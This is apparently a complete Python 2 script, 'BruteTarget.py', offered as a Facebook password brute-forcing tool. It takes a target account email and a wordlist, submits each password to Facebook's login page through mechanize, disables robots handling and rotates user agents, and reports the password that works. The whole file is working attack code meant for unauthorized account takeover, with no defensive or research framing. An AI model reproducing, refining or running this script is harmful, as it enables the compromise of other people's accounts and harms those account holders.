#!/usr/bin/env python2
# encoding: utf-8
"""
BruteTarget.py

Created by AuthenticXploit on 10/06/2021.
Copyright (c) 2021 Copyright Holder. All rights reserved.
"""

# Import module
try:
    import sys
    import mechanize
    import cookielib
    import random
    import os
    import time
    from os import system
    from time import sleep
    from sys import exit
except ImportError as f:
    system("clear")
    print("\033[32;1m[\033[31;1m!\033[32;1m] \033[0;33mError \033[31;1m: \033[37;1m{}".format(f))

banner = """\033[36;1m
  ____             _       _____ ____  
 | __ ) _ __ _   _| |_ ___|  ___| __ ) 
 |  _ \| '__| | | | __/ _ \ |_  |  _ \\\033[1;97m
 | |_) | |  | |_| | ||  __/  _| | |_) |
 |____/|_|   \__,_|\__\___|_|   |____/ 
                     
     \x1b[1;97m Author   \033[31;1m:  \033[32mAuthenticXploit
     \x1b[1;97m Type     \033[31;1m:  \033[32mBruteForce
     \x1b[1;97m Version  \033[31;1m:  \033[32m0.3
     \x1b[1;97m Contact  \033[31;1m:  \033[32mhttps://t.me/AuthenticXploit_bot
     \x1b[1;97m
"""

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)

system("clear")
slowprint(banner)
email = str(raw_input("\033[37;1minput facebook target \033[31;1m: \033[33;1m"))
passwordlist = str(raw_input("\033[37;1minput wordlist \033[31;1m: \033[33;1m"))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    try:
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        menu()
        search()
        print("\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m Password does not exist in the wordlist")
    except mechanize.URLError:
        print("\n\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m No Connection")
        sleep(2)
        print("\033[32;1m[\033[31;1m!\033[32;1m] \033[31;1mExit\x1b[0m")
        exit()

def brute(password):
    sys.stdout.write("\033[36;1m\r[\033[33;1m-\033[36;1m] \033[37;1mTrying Password \033[31;1m=> \033[33;1m{}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr = 0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and (not 'login_attempt' in log):
        print("\033[36;1m[\033[33;1m+\033[36;1m] \033[37;1mPassword Found => \033[32;1m{}".format(password))
        raw_input("\033[31;1mANY KEY to Exit....")
        exit(1)

def search():
    global password
    passwords = open(passwordlist,"r")
    for password in passwords:
        password = password.replace("\n","")
        brute(password)

#menu
def menu():
    try:
        total = open(passwordlist,"r")
        total = total.readlines()
        print(banner)
        print "\033[36;1m[\033[31;1m-\033[36;1m] \033[32;1mAccount to crack \033[31;1m> \033[0;33m{}".format(email)
        print "\033[36;1m[\033[31;1m-\033[36;1m] \033[32;1mLoaded \033[31;1m>\033[0;33m" , len(total), "passwords"
        print("\033[36;1m[\033[31;1m-\033[36;1m] \033[33;1mCracking, please wait ...\n")
    except IOError:
        print("\n\033[32;1m[\033[31;1m!\033[32;1m]\033[33;1m File wordlist \033[36;1m{} \033[33;1mNot Found\x1b[0m".format(passwordlist))
        exit()
	
if __name__ == '__main__':
    try:
        main()
    except(KeyboardInterrupt, EOFError):
        print("\033[36;1m\n[\033[31;1m!\033[36;1m]\033[33;1mDetects a forced stop program \x1b[0m")
        exit(0)